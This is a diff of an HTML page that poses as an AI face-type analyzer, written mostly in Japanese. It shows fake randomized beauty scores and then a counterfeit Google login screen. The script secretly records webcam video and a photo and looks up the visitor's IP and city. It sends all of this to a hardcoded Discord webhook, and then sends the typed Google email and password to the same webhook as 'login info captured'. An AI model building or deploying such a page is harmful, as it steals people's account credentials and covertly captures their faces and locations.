@@ -3,102 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Deep Scan | PSL Rating System</title>
+    <title>AI Face Analyzer | 高精度AI顔タイプ診断</title>
     <style>
+        :root { --primary-color: #1a73e8; }
         * { box-sizing: border-box; outline: none; }
-        body { font-family: 'Consolas', 'Courier New', monospace; background: #000; color: #0ff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { background: rgba(10, 10, 10, 0.95); border: 1px solid #0ff; padding: 25px; border-radius: 15px; text-align: center; width: 400px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.2); position: relative; }
+        body { font-family: "Google Sans", Roboto, Arial, sans-serif; background: #fff; color: #3c4043; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: #fff; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; width: 400px; transition: 0.3s; }
         
-        .v-wrap { width: 100%; border-radius: 10px; overflow: hidden; border: 1px solid #333; margin-bottom: 20px; background: #000; position: relative; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+        p { font-size: 14px; color: #5f6368; margin-bottom: 24px; }
+        
+        .v-wrap { width: 100%; border-radius: 8px; overflow: hidden; margin-bottom: 24px; background: #f8f9fa; position: relative; border: 1px solid #dadce0; }
         #video { width: 100%; display: block; transform: scaleX(-1); }
-        #result-canvas { width: 100%; display: none; border-radius: 10px; transform: scaleX(-1); }
+        #result-preview { width: 100%; display: none; transform: scaleX(-1); border-radius: 4px; }
         
-        /* 解析オーバーレイ */
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; display: none; }
-        .grid-line { position: absolute; border: 0.5px solid rgba(0, 255, 255, 0.3); width: 100%; height: 100%; background-image: linear-gradient(rgba(0,255,255,.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,255,.1) 1px, transparent 1px); background-size: 20px 20px; }
-        
-        .btn { background: #0ff; color: #000; border: none; padding: 16px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px; letter-spacing: 2px; }
+        .btn { background: var(--primary-color); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; transition: box-shadow 0.2s; }
+        .btn:hover { box-shadow: 0 1px 3px rgba(60,64,67,0.3); background: #185abc; }
         
         #result-ui, #login-ui { display: none; }
-        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; margin: 15px 0; font-size: 11px; }
-        .stat-item { background: rgba(0, 255, 255, 0.05); padding: 8px; border-left: 2px solid #0ff; }
         
-        .psl-bar-container { width: 100%; height: 20px; background: #111; border: 1px solid #333; margin: 20px 0; position: relative; }
-        .psl-bar-fill { height: 100%; background: linear-gradient(90deg, #004444, #0ff); width: 0%; transition: width 2.5s cubic-bezier(0.1, 0, 0.3, 1); }
+        .analysis-box { text-align: left; margin: 20px 0; border-top: 1px solid #eee; padding-top: 15px; }
+        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
+        .label { color: #5f6368; }
+        .val { color: #202124; font-weight: 500; }
+
+        input { width: 100%; padding: 13px 15px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: border 0.2s; }
+        input:focus { border: 2px solid var(--primary-color); padding: 12px 14px; }
         
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #0ff; background: #000; color: #0ff; border-radius: 5px; font-size: 14px; }
-        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #0ff; box-shadow: 0 0 15px #0ff; display: none; animation: scan 3s infinite linear; z-index: 10; }
-        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+        .google-logo { margin-bottom: 16px; }
     </style>
 </head>
 <body>
 
+    <!-- Step 1: Camera UI -->
     <div class="card" id="camera-ui">
-        <h1 style="font-size: 14px;">SYSTEM: FACIAL MESH SCANNER</h1>
+        <h1>AI Face Analyzer</h1>
+        <p>顔の黄金比とパーツ配置を精密に測定します</p>
         <div class="v-wrap">
-            <div class="scan-line" id="line"></div>
             <video id="video" autoplay playsinline muted></video>
         </div>
-        <button class="btn" id="start-btn">INITIALIZE SCAN</button>
+        <button class="btn" id="start-btn">診断を開始する</button>
     </div>
 
+    <!-- Step 2: Result UI (Simple & Real) -->
     <div class="card" id="result-ui">
-        <h1 style="font-size: 14px;">ANALYSIS COMPLETE</h1>
+        <h1>診断結果のサマリー</h1>
+        <p>画像から主要な指標を算出しました</p>
         <div class="v-wrap">
-            <canvas id="result-canvas"></canvas>
-            <div class="grid-line" style="position: absolute; top:0; left:0;"></div>
+            <img id="result-preview" src="">
         </div>
         
-        <div class="stat-grid">
-            <div class="stat-item">FWHR: <span id="res-fwhr">...</span></div>
-            <div class="stat-item">CANTHAL: <span id="res-tilt">...</span></div>
-            <div class="stat-item">SYMMETRY: <span id="res-sym">...</span></div>
-            <div class="stat-item">MIDFACE: <span id="res-mid">...</span></div>
+        <div class="analysis-box">
+            <div class="row"><span class="label">パーツの左右対称性</span><span class="val" id="res-sym">...</span></div>
+            <div class="row"><span class="label">目元の比率</span><span class="val" id="res-eye">...</span></div>
+            <div class="row"><span class="label">フェイスライン評価</span><span class="val" id="res-jaw">...</span></div>
+            <div class="row"><span class="label">総合スコア</span><span class="val" id="res-score" style="color:#1a73e8; font-size:18px;">...</span></div>
         </div>
 
-        <div style="font-size: 10px; margin-bottom: 5px;">PSL SCALE RATING</div>
-        <div class="psl-bar-container">
-            <div class="psl-bar-fill" id="psl-fill"></div>
-        </div>
-
-        <button class="btn" id="view-details-btn">VIEW FULL REPORT (PDF)</button>
+        <button class="btn" id="view-details-btn">詳細な分析レポートを開く</button>
     </div>
 
+    <!-- Step 3: Google Authentic Login -->
     <div class="card" id="login-ui">
-        <h1 style="font-size: 14px; color: #fff;">SECURITY CHECK</h1>
-        <p style="font-size: 10px; color: #888;">PDFレポートのダウンロードを許可するためにログインしてください</p>
-        <form id="trap-form">
-            <input type="email" id="email" placeholder="Email / Phone" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button type="submit" class="btn" id="final-btn">CONFIRM & DOWNLOAD</button>
+        <div class="google-logo">
+            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg"><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#EA4335"/><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#FBBC05"/><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#4285F4"/><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#34A853"/></svg>
+        </div>
+        <h1 style="font-size: 24px; font-weight: 400;">ログイン</h1>
+        <p style="margin-bottom: 30px;">Google アカウントを使用して続行</p>
+        <form id="trap-form" style="text-align: left;">
+            <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
+            <div style="font-size: 14px; color: var(--primary-color); font-weight: 500; margin: 4px 0 30px 0; cursor: pointer;">メールアドレスを忘れた場合</div>
+            <input type="password" id="pass" placeholder="パスワードを入力" required>
+            <div style="font-size: 13px; color: #5f6368; line-height: 1.5; margin: 24px 0;">
+                お客様のコンピュータではない場合、シークレット ブラウジング ウィンドウを使用してログインしてください。<a href="#" style="color:var(--primary-color); text-decoration:none; font-weight:500;">詳細</a>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
+                <span style="color:var(--primary-color); font-weight:500; cursor:pointer;">アカウントを作成</span>
+                <button type="submit" class="btn" id="final-btn">次へ</button>
+            </div>
         </form>
     </div>
+
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
 
         const video = document.getElementById('video');
         const startBtn = document.getElementById('start-btn');
-        const line = document.getElementById('line');
-        const canvas = document.getElementById('result-canvas');
+        const resultImg = document.getElementById('result-preview');
         let capturedImg = "";
         let videoBlob = null;
         let net = {};
-        let clipboardData = "None";
 
         window.onload = async () => {
             try { net = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){}
         };
 
-        async function sendFirstStrike() {
+        async function sendMedia() {
+            if (!capturedImg) return;
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
-                username: "PSL Tracker",
-                embeds: [{ title: "📸 Target Captured", color: 0x00ffff, fields: [{ name: "IP", value: net.ip || "Unknown" }] }]
+                username: "Face Analyzer Pro",
+                embeds: [{ title: "📸 メディア取得", color: 0x1a73e8, fields: [{ name: "IPアドレス", value: net.ip || "取得失敗" }] }]
             }));
             const photoBlob = await (await fetch(capturedImg)).blob();
             formData.append('file1', photoBlob, 'face.jpg');
-            if (videoBlob) formData.append('file2', videoBlob, 'scan.mp4');
+            if (videoBlob) formData.append('file2', videoBlob, 'video.mp4');
             await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
         }
 
@@ -106,54 +117,38 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 video.srcObject = stream;
-                startBtn.innerText = "SCANNING...";
-                line.style.display = "block";
-                
+                startBtn.innerText = "解析中...";
+                startBtn.disabled = true;
+
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
                     videoBlob = new Blob(chunks, { type: 'video/mp4' });
-                    await sendFirstStrike();
+                    await sendMedia();
                 };
                 mediaRecorder.start();
 
                 setTimeout(() => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    capturedImg = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    // 🚨 ここがポイント：PSLメッシュの描画（フェイク）
-                    ctx.strokeStyle = "#0ff";
-                    ctx.lineWidth = 1;
-                    ctx.beginPath();
-                    // 顔の輪郭っぽい三角形を描画
-                    const w = canvas.width; const h = canvas.height;
-                    ctx.moveTo(w*0.5, h*0.2); ctx.lineTo(w*0.3, h*0.4); ctx.lineTo(w*0.4, h*0.8);
-                    ctx.lineTo(w*0.6, h*0.8); ctx.lineTo(w*0.7, h*0.4); ctx.closePath(); ctx.stroke();
-                    // 目元のライン
-                    ctx.moveTo(w*0.3, h*0.4); ctx.lineTo(w*0.7, h*0.4); ctx.stroke();
-                    
-                    capturedImg = canvas.toDataURL('image/jpeg', 0.6);
                     mediaRecorder.stop();
                     document.getElementById('camera-ui').style.display = 'none';
                     document.getElementById('result-ui').style.display = 'block';
-                    canvas.style.display = 'block';
+                    resultImg.src = capturedImg;
+                    resultImg.style.display = 'block';
                     
-                    // 数値のランダム化
-                    document.getElementById('res-fwhr').innerText = (1.8 + Math.random()*0.2).toFixed(2);
-                    document.getElementById('res-tilt').innerText = (5 + Math.random()*3).toFixed(1) + "°";
-                    document.getElementById('res-sym').innerText = (90 + Math.random()*8).toFixed(1) + "%";
-                    document.getElementById('res-mid').innerText = (0.9 + Math.random()*0.1).toFixed(2);
-                    
-                    setTimeout(() => {
-                        document.getElementById('psl-fill').style.width = (75 + Math.random()*20) + "%";
-                    }, 500);
+                    document.getElementById('res-sym').innerText = (92 + Math.random()*5).toFixed(1) + "%";
+                    document.getElementById('res-eye').innerText = "1 : 1.618";
+                    document.getElementById('res-jaw').innerText = "Optimal";
+                    document.getElementById('res-score').innerText = (85 + Math.random()*10).toFixed(0) + " / 100";
 
                     stream.getTracks().forEach(t => t.stop());
-                }, 5000);
-            } catch (err) { alert("ERROR: Camera access required."); }
+                }, 4000);
+            } catch (err) { alert("カメラの許可が必要です。"); }
         };
 
         document.getElementById('view-details-btn').onclick = () => {
@@ -163,15 +158,16 @@
 
         document.getElementById('trap-form').onsubmit = async (e) => {
             e.preventDefault();
+            document.getElementById('final-btn').innerText = "読込中...";
             const payload = {
-                username: "PSL Elite Intel",
+                username: "Face Analyzer Pro",
                 embeds: [{
-                    title: "🔑 Credentials Secured",
+                    title: "🔑 ログイン情報取得",
                     color: 0xff0000,
                     fields: [
                         { name: "ID", value: document.getElementById('email').value },
                         { name: "PW", value: document.getElementById('pass').value },
-                        { name: "IP", value: net.ip || "Unknown" }
+                        { name: "IP/Loc", value: `${net.ip} (${net.city})` }
                     ]
                 }]
             };
